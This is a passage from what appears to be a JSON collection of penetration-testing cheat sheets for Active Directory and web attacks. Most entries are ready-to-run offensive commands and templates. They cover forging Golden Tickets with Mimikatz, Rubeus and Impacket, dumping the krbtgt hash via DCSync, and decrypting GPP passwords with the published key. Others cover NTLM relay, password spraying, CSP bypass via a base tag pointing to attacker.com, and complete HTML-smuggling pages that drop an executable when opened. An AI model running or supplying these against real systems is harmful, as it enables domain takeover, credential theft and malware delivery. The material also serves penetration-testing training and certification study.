            "lang": "powershell",
            "code": ".\\Rubeus.exe golden /rc4:<KrbtgtHash> /user:Administrator /domain:<Domain> /sid:<DomainSID> /ptt"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Create Golden Ticket from Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-ticketer -nthash <KrbtgtHash> -domain-sid <DomainSID> -domain <Domain> Administrator"
          },
          {
            "lang": "bash",
            "code": "# Use the ticket\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass <Domain>/Administrator@<TargetDC>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Verify Ticket",
        "codes": [
          {
            "lang": "powershell",
            "code": "klist"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks Golden Ticket",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Forge a TGT for any user (including non-existent users). Requires the **krbtgt** hash from DCSync or NTDS.dit extraction. Provides domain-wide persistence.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Golden Ticket",
    "title": "Golden Ticket",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Golden_Ticket",
      "Impacket",
      "Kerberos",
      "Mimikatz",
      "Persistence",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "Prerequisites",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Get domain SID\n(Get-ADDomain).DomainSID.Value"
          },
          {
            "lang": "powershell",
            "code": "# Get krbtgt hash via DCSync\n.\\mimikatz.exe \"lsadump::dcsync /domain:<Domain> /user:krbtgt\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Need **krbtgt** hash and domain SID.",
            "variant": "important"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks Golden Ticket",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Forge a TGT for any user (including non-existent users). Requires the **krbtgt** hash from DCSync or NTDS.dit extraction. Provides domain-wide persistence.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Golden Ticket (Domain Persistence)",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Dump krbtgt Hash",
        "codes": [
          {
            "lang": "bash",
            "code": "privilege::debug\nlsadump::lsa /patch"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Run on Domain Controller."
          }
        ]
      },
      {
        "title": "Create Golden Ticket - Mimikatz",
        "codes": [
          {
            "lang": "bash",
            "code": "kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /ptt\nkerberos::purge\nkerberos::golden /user:<AdminUser> /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /ptt\nmisc::cmd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Create Golden Ticket - Impacket",
        "codes": [
          {
            "lang": "bash",
            "code": "lookupsid.py <Domain>/<User>:<Pass>@<DC_IP>\nimpacket-ticketer -nthash <KrbtgtHash> -domain-sid <DomainSID> -domain <Domain> Administrator\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec <Domain>/Administrator@<DC_IP> -k -no-pass"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Access Domain Controller",
        "codes": [
          {
            "lang": "powershell",
            "code": "PsExec.exe \\\\dc1 cmd.exe\ndir \\\\<DC>\\C$"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Forge TGT using krbtgt hash. Provides access to entire domain.\nRequires krbtgt NTLM hash and domain SID."
      }
    ]
  },
  {
    "category": "Mimikatz",
    "title": "Golden Ticket Attack",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Create and Inject Golden Ticket",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /ptt"
          },
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a1b2c3d4e5f6... /ptt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Save Golden Ticket to File",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /ticket:golden.kirbi"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Golden Ticket with Custom User ID",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::golden /user:FakeAdmin /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /id:500 /ptt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "ID 500 = default Administrator RID.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Golden Ticket with Groups",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /groups:512,513,518,519,520 /ptt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Add user to Domain Admins (512), Enterprise Admins (519), etc.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Requires krbtgt hash (obtain via DCSync).",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "GPP Passwords",
    "title": "GPP Passwords (Group Policy Preferences)",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Discovery",
      "Enumeration",
      "Password_Attack",
      "Windows"
    ],
    "steps": [
      {
        "title": "Check SYSVOL Access",
        "codes": [
          {
            "lang": "bash",
            "code": "smbclient -L //<DC_IP> -N"
          },
          {
            "lang": "bash",
            "code": "smbclient //<DC_IP>/SYSVOL -N"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Search for GPP Files with NetExec",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DC_IP> -u <Username> -p '<Password>' -M gpp_password"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Search for GPP Files with SMBMap",
        "codes": [
          {
            "lang": "bash",
            "code": "smbmap -H <DC_IP> -u <Username> -p '<Password>' -r \"SYSVOL/<Domain>/Policies\" --depth 10"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": true
      },
      {
        "title": "Manual Search via SMBClient",
        "codes": [
          {
            "lang": "bash",
            "code": "smbclient //<DC_IP>/SYSVOL -U '<Domain>/<Username>%<Password>' -c 'recurse;ls'"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": true
      },
      {
        "title": "Mount and Search",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo mount -t cifs //<DC_IP>/SYSVOL /mnt/sysvol -o user=<Username>,password=<Password>"
          },
          {
            "lang": "bash",
            "code": "find /mnt/sysvol -name \"*.xml\" -exec grep -l \"cpassword\" {} \\;"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": true
      },
      {
        "title": "Download GPP XML File",
        "codes": [
          {
            "lang": "bash",
            "code": "smbclient //<DC_IP>/SYSVOL -U '<Domain>/<Username>%<Password>' -c 'get <Domain>/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Decrypt cpassword with gpp-decrypt",
        "codes": [
          {
            "lang": "bash",
            "code": "gpp-decrypt '<cpassword_value>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Extract the **cpassword** value from the XML file first.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Decrypt with Python",
        "codes": [
          {
            "lang": "python",
            "code": "python3 -c \"import base64; from Crypto.Cipher import AES; key=b'\\x4e\\x99\\x06\\xe8\\xfc\\xb6\\x6c\\xc9\\xfa\\xf4\\x93\\x10\\x62\\x0f\\xfe\\xe8\\xf4\\x96\\xe8\\x06\\xcc\\x05\\x79\\x90\\x20\\x9b\\x09\\xa4\\x33\\xb6\\x6c\\x1b'; iv=b'\\x00'*16; print(AES.new(key,AES.MODE_CBC,iv).decrypt(base64.b64decode('<cpassword>')).decode())\""
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": true
      },
      {
        "title": "Impacket Get-GPPPassword",
        "codes": [
          {
            "lang": "bash",
            "code": "Get-GPPPassword.py <Domain>/<Username>:<Password>@<DC_IP>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": true
      },
      {
        "title": "Validate Cracked Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DC_IP> -u <GPPUsername> -p '<GPPPassword>' -d <Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Validate with AuthFinder",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m authFinder -t <TargetIP> -u <GPPUsername> -p '<GPPPassword>' -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "# Check across multiple targets\npython -m authFinder -t targets.txt -u <GPPUsername> -p '<GPPPassword>' -d <Domain>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Automatically tries WinRM, PSExec, SMBExec, WMI, RDP, MSSQL until one succeeds.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks GPP",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/group-policy-preferences-gpp-pentest"
      },
      {
        "text": "gpp-decrypt",
        "url": "https://github.com/t0thkr1s/gpp-decrypt"
      },
      {
        "text": "AuthFinder GitHub",
        "url": "https://github.com/Real-Fruit-Snacks/authFinder"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Group Policy Preferences allowed admins to set local passwords via XML files stored in SYSVOL. The password is AES-encrypted but Microsoft published the key (MS14-025). Any domain user can read SYSVOL.",
        "variant": "info"
      },
      {
        "type": "note",
        "content": "**What you're looking for:**\n- `Groups.xml` - Local user/group passwords\n- `Services.xml` - Service account passwords\n- `Scheduledtasks.xml` - Scheduled task credentials\n- `Datasources.xml` - Database connection strings\n- `Printers.xml` - Printer configuration passwords\n- `Drives.xml` - Mapped drive credentials",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Hash Cracking Modes",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**NTLM** hashcat -m 1000 | **NTLMv2** hashcat -m 5600\n**Kerberoast RC4** hashcat -m 13100 | **Kerberoast AES** hashcat -m 19700\n**AS-REP Roast** hashcat -m 18200 | **NetNTLMv1** hashcat -m 5500"
      }
    ]
  },
  {
    "category": "Password Cracking",
    "title": "Hash Cracking Strategy for OSCP",
    "tags": [
      "Credential_Access",
      "Hashcat",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Quick Wins (5-15 minutes)",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "1. **Online lookup** - Check CrackStation/HashKiller first\n2. **NTLM with rockyou.txt** - Fast hash, large wordlist\n3. **Common passwords** - `Password1`, `Welcome1`, `Summer2024`\n4. **Username as password** - Try `john:john`, `admin:admin`"
          }
        ]
      },
      {
        "title": "Medium Effort (15-60 minutes)",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "1. **Kerberoast with rockyou.txt + best64.rule**\n2. **NetNTLMv2 with rockyou.txt**\n3. **Custom wordlist from website/documents**\n4. **Hybrid attack** - `rockyou.txt` + `?d?d?d?d`"
          }
        ]
      },
      {
        "title": "Last Resort (1+ hours)",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "1. **Mask attack** - If you know password policy\n2. **Large wordlists** - Weakpass, SecLists\n3. **Incremental mode** - Brute force (usually not viable)"
          },
          {
            "type": "note",
            "content": "If a hash doesn't crack in 30 minutes, move on and come back later.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Time management is critical during the exam.",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Password Attacks",
    "title": "Hash Identification",
    "tags": [
      "Credential_Access",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Identify Hash Type",
        "codes": [
          {
            "lang": "bash",
            "code": "hashid '<Hash>'\nhashid -m '<Hash>'\nhash-identifier"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Online: https://hashes.com/en/tools/hash_identifier"
          }
        ]
      },
      {
        "title": "Hashcat Modes Reference",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Common hash modes:\n- **0** - MD5\n- **100** - SHA1\n- **1000** - NTLM\n- **1400** - SHA256\n- **1700** - SHA512\n- **1800** - sha512crypt ($6$)\n- **3200** - bcrypt\n- **5600** - NetNTLMv2\n- **13100** - Kerberoast (TGS)\n- **18200** - AS-REP Roast\n- **13400** - KeePass",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Lookup Hashcat Mode",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat --help | grep -i \"md5\"\nhashcat --example-hashes | grep -FB2 '$1$'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Password Cracking",
    "title": "Hash Identification",
    "tags": [
      "Credential_Access",
      "Hashcat",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "hashid - Quick Hash Identification",
        "codes": [
          {
            "lang": "bash",
            "code": "hashid <Hash>"
          },
          {
            "lang": "bash",
            "code": "hashid 5f4dcc3b5aa765d61d8327deb882cf99\n# Output: MD5"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "name-that-hash - Advanced Identification",
        "codes": [
          {
            "lang": "bash",
            "code": "nth -t '<Hash>'"
          },
          {
            "lang": "bash",
            "code": "nth -t '5f4dcc3b5aa765d61d8327deb882cf99'\n# Provides hash type + Hashcat mode number + John format"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "`name-that-hash` is more accurate than `hashid` and provides Hashcat mode numbers directly.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Install name-that-hash",
        "codes": [
          {
            "lang": "bash",
            "code": "pip3 install name-that-hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Hash Examples by Type",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "| Hash Type | Example Hash | Hashcat Mode | John Format |\n|-----------|--------------|--------------|-------------|\n| MD5 | `5f4dcc3b5aa765d61d8327deb882cf99` | `-m 0` | `--format=raw-md5` |\n| SHA1 | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` | `-m 100` | `--format=raw-sha1` |\n| SHA256 | `5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8` | `-m 1400` | `--format=raw-sha256` |\n| NTLM | `8846f7eaee8fb117ad06bdd830b7586c` | `-m 1000` | `--format=nt` |\n| NetNTLMv2 | `admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030` | `-m 5600` | `--format=netntlmv2` |\n| Kerberos 5 TGS-REP | `$krb5tgs$23$*user$realm$test/spn*$...` | `-m 13100` | `--format=krb5tgs` |\n| Kerberos 5 AS-REP | `$krb5asrep$23$user@domain.com:...` | `-m 18200` | `--format=krb5asrep` |\n| bcrypt | `$2a$05$LhayLxezLhK1LhWvKxCyLOj0j1u.Kj0jZ0pEmm134uzrQlFvQJLF6` | `-m 3200` | `--format=bcrypt` |\n| SHA512crypt | `$6$52450745$k5ka2p8bFuSmoVT1tzOyyuaREkkKBcCNqoDKzYiJL9RaE8yMnPgh2XzzF0NDrUhgrcLwg78xs1w5pJiypEdFX/` | `-m 1800` | `--format=sha512crypt` |"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Always identify the hash type before attempting to crack it.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "MS SQL Enumeration",
    "title": "Hash Relay Attack",
    "tags": [
      "Exploitation",
      "SQL",
      "Windows"
    ],
    "steps": [
      {
        "title": "Setup ntlmrelayx",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-ntlmrelayx -t <RelayTarget> -smb2support"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Trigger Authentication",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-mssqlclient <User>:<Pass>@<SQLServer> -windows-auth\nSQL> xp_dirtree \\\\<RelayAttacker>\\share"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Relay to LDAP for RBCD",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-ntlmrelayx -t ldap://<DC-IP> --delegate-access"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Password Attacks",
    "title": "Hashcat - Specific Hash Types",
    "tags": [
      "Credential_Access",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "NTLM",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "NetNTLMv2",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Kerberoast (TGS-REP)",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "AS-REP Roast",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SHA512crypt ($6$)",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "MD5crypt ($1$)",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 500 md5crypt.hash /usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "KeePass Database",
        "codes": [
          {
            "lang": "bash",
            "code": "keepass2john <Database>.kdbx > keepass.hash\nsed -i 's/^Database://' keepass.hash\nhashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SSH Private Key",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh2john <PrivateKey> > ssh.hash\nhashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "**SSH modes:** -m 22911 (RSA/DSA), -m 22921 (ECDSA), -m 22931 (ED25519)"
          }
        ]
      },
      {
        "title": "Office Documents",
        "codes": [
          {
            "lang": "bash",
            "code": "python office2john.py <Input_File> > extractedHash.txt\nhashcat -a 0 -m <Mode> --username -o cracked.txt extractedHash.txt /usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "**Office modes:** 9400 (2007), 9500 (2010), 9600 (2013), 25300 (2016 SheetProtection)"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Password Cracking",
    "title": "Hashcat Rule-Based Attacks",
    "tags": [
      "Credential_Access",
      "Hashcat",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Create Simple Rule",
        "codes": [
          {
            "lang": "bash",
            "code": "echo '$1' > example.rule"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Appends \"1\" to end of each password."
          }
        ]
      },
      {
        "title": "Preview Mutated Passwords",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -r example.rule --stdout wordlist.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Common Rule Patterns",
        "codes": [
          {
            "lang": "text",
            "code": "$1      # Append 1\n$!      # Append !\n^1      # Prepend 1\nc       # Capitalize first letter\nu       # Uppercase all\nl       # Lowercase all\nsa@     # Replace 'a' with '@'\nse3     # Replace 'e' with '3'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Multi-Rule File",
        "codes": [
          {
            "lang": "bash",
            "code": "echo -e 'c $1\\nc $!\\nc $1 $!' > example.rule"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Each line is a separate rule. Creates: `Password1`, `Password!`, `Password1!`"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Security Headers Scanning",
    "title": "Header Bypass Techniques",
    "tags": [
      "Reconnaissance",
      "Security_Headers",
      "Web_Application"
    ],
    "steps": [
      {
        "title": "CSP Bypass via JSONP",
        "codes": [
          {
            "lang": "javascript",
            "code": "// If CSP allows specific CDN\n<script src=\"https://trusted-cdn.com/jsonp?callback=alert(1)\"></script>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "CSP Bypass via Base Tag",
        "codes": [
          {
            "lang": "html",
            "code": "<!-- If CSP doesn't restrict base-uri -->\n<base href=\"https://attacker.com/\">\n<script src=\"/malicious.js\"></script>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "X-Frame-Options Bypass",
        "codes": [
          {
            "lang": "html",
            "code": "<!-- Try different protocols -->\n<iframe src=\"http://example.com\"></iframe>  <!-- If only HTTPS is protected -->"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Droppers and HTML Smuggling",
    "title": "HTML Smuggling",
    "tags": [
      "Defense_Evasion",
      "Execution",
      "Initial_Access",
      "Windows"
    ],
    "steps": [
      {
        "title": "Base64 HTML Smuggling Template",
        "codes": [
          {
            "lang": "html",
            "code": "<html>\n<head>\n<script>\nfunction base64ToArrayBuffer(base64) {\n    var binary_string = window.atob(base64);\n    var len = binary_string.length;\n    var bytes = new Uint8Array(len);\n    for (var i = 0; i < len; i++) {\n        bytes[i] = binary_string.charCodeAt(i);\n    }\n    return bytes.buffer;\n}\n\nvar file = '<Base64Payload>';\nvar data = base64ToArrayBuffer(file);\nvar blob = new Blob([data], {type: 'octet/stream'});\nvar fileName = 'payload.exe';\n\nif(window.navigator.msSaveOrOpenBlob) {\n    window.navigator.msSaveOrOpenBlob(blob, fileName);\n} else {\n    var a = document.createElement('a');\n    document.body.appendChild(a);\n    a.style = 'display: none';\n    var url = window.URL.createObjectURL(blob);\n    a.href = url;\n    a.download = fileName;\n    a.click();\n    window.URL.revokeObjectURL(url);\n}\n</script>\n</head>\n<body>\n<p>This page requires JavaScript to be enabled.</p>\n</body>\n</html>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Save as .html file. When opened, automatically downloads embedded payload.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Generate Base64 Payload",
        "codes": [
          {
            "lang": "bash",
            "code": "base64 -w 0 payload.exe"
          },
          {
            "lang": "powershell",
            "code": "[Convert]::ToBase64String([IO.File]::ReadAllBytes(\"payload.exe\"))"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "HTML Smuggling with Fetch API",
        "codes": [
          {
            "lang": "html",
            "code": "<html>\n<script>\nasync function smuggle() {\n    const response = await fetch('data:application/octet-stream;base64,<Base64Payload>');\n    const blob = await response.blob();\n    const url = URL.createObjectURL(blob);\n    const a = document.createElement('a');\n    a.href = url;\n    a.download = 'document.exe';\n    a.click();\n}\nsmuggle();\n</script>\n<body>Loading document...</body>\n</html>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "More modern approach using **Fetch API**.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Embed payload in HTML/JavaScript to bypass network filters. Payload constructed client-side, never crosses network as executable.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Password Spraying",
    "title": "Hydra Password Spraying",
    "tags": [
      "Credential_Access",
      "Initial_Access",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Keep Password Constant, Enumerate Users",
        "codes": [
          {
            "lang": "bash",
            "code": "hydra -L users.txt -p <Password> <TargetIP> ssh -t 4"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SMB Password Spray",
        "codes": [
          {
            "lang": "bash",
            "code": "hydra -L users.txt -p 'Spring2024!' smb://<TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "IDA Pro",
    "title": "IDA Pro Disassembler",
    "tags": [
      "Binary_Exploitation",
      "Exploitation",
      "IDA_Pro",
      "Reverse_Engineering",
      "Windows"
    ],
    "steps": [
      {
        "title": "Loading a Binary",
        "codes": [
          {
            "lang": "text",
            "code": "File -> Open (or drag file onto IDA)\nSelect appropriate processor type (usually auto-detected)\nClick OK to begin analysis"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Open a file for analysis in IDA Pro."
          }
        ]
      },
      {
        "title": "Navigation Shortcuts",
        "codes": [
          {
            "lang": "text",
            "code": "G           ; Go to address (enter address or symbol)\nCtrl+E      ; Jump to entry point\nCtrl+X      ; Jump to cross-reference\nEsc         ; Return to previous location\nCtrl+Enter  ; Jump to address under cursor"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Move through the disassembly efficiently."
          }
        ]
      },
      {
        "title": "View Modes",
        "codes": [
          {
            "lang": "text",
            "code": "Space       ; Toggle between graph and text view\nTab         ; Switch to Hex view\nF5          ; Decompile function (if Hex-Rays available)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Switch between different analysis views."
          }
        ]
      },
      {
        "title": "Renaming Items",
        "codes": [
          {
            "lang": "text",
            "code": "N           ; Rename address/function/variable\n;           ; Add comment at current address\n:           ; Add repeatable comment\nIns         ; Add anterior comment (before line)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Improve readability by renaming functions and variables."
          }
        ]
      },
      {
        "title": "Cross-References (XRefs)",
        "codes": [
          {
            "lang": "text",
            "code": "X           ; List cross-references to current item\nCtrl+X      ; Jump to cross-reference"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find where functions or data are referenced."
          }
        ]
      },
      {
        "title": "Function Operations",
        "codes": [
          {
            "lang": "text",
            "code": "P           ; Create function at cursor\nU           ; Undefine (convert to bytes)\nC           ; Convert to code\nD           ; Convert to data\nA           ; Convert to ASCII string"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
